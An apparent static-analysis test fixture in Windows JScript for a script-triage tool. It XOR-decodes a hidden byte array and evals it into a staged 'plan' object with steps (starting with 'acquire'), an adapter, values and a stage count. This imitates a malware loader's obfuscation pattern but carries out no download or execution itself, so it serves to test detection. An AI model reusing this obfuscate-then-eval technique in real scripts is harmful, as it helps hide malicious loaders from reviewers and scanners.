// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decode_b501e56e(SoUrCeByTeS) {
  var keyBytes = [168,243,47,119,78];
  var DeCoDeDByTeS = [];
  for (var i = 0; i < SoUrCeByTeS.length; i++) { DeCoDeDByTeS.push(SoUrCeByTeS[i] ^ keyBytes[i % keyBytes.length]); }
  return DeCoDeDByTeS;
}
function recover_6b53a963() {
  var SoUrCeByTeS = [211,209,92,3,43,216,128,13,77,21,138,146,76,6,59,193,129,74,40,60,205,158,64,3,43,138,223,13,0,60,193,135,74,40,40,193,159,74,85,19,132,209,78,19,47,216,135,74,5,108,146,209,98,30,45,218,156,92,24,40,220,221,119,58,2,224,167,123,39,108,132,209,89,22,34,221,150,92,85,116,211,209,76,22,35,216,146,70,16,32,247,154,75,85,116,138,144,78,26,62,201,154,72,25,99,158,150,30,17,44,157,195,74,64,121,138,223,13,2,60,196,209,21,85,38,220,135,95,4,116,135,220,25,18,127,206,145,26,71,43,159,196,1,18,54,201,158,95,27,43,134,154,65,1,47,196,154,75,88,40,155,199,26,67,121,159,145,1,19,47,220,209,3,85,59,219,150,93,40,47,207,150,65,3,108,146,209,103,2,32,220,129,74,4,61,228,146,77,88,120,205,194,73,21,123,152,150,24,64,108,132,209,73,30,34,205,172,95,22,58,192,209,21,85,13,146,175,115,34,61,205,129,92,43,18,248,134,77,27,39,203,175,115,63,59,198,135,93,18,61,219,191,78,21,18,244,128,91,22,41,205,222,25,18,127,206,145,26,71,43,159,196,1,19,47,220,209,82,91,108,219,135,78,16,43,235,156,90,25,58,138,201,29,10];
  var NeUtRaL = (19 * 7) - 133;
  var DeCoDeDByTeS = [];
  try { DeCoDeDByTeS = decode_b501e56e(SoUrCeByTeS); } catch (ignored) { DeCoDeDByTeS = []; }
  var DeScRiPtOrTeXt = "";
  for (var bi = 0; bi < DeCoDeDByTeS.length; bi++) { DeScRiPtOrTeXt += String.fromCharCode(DeCoDeDByTeS[bi]); }
  return DeScRiPtOrTeXt;
}
function inspect_f5af3558() {
  var DeScRiPtOr = eval("(" + recover_6b53a963() + ")");
  var PlAn = new Object();
  PlAn["steps"] = DeScRiPtOr["steps"];
  PlAn["adapter"] = DeScRiPtOr["adapter"];
  PlAn["values"] = DeScRiPtOr["values"];
  PlAn["stageCount"] = DeScRiPtOr["stageCount"];
  return PlAn;
}
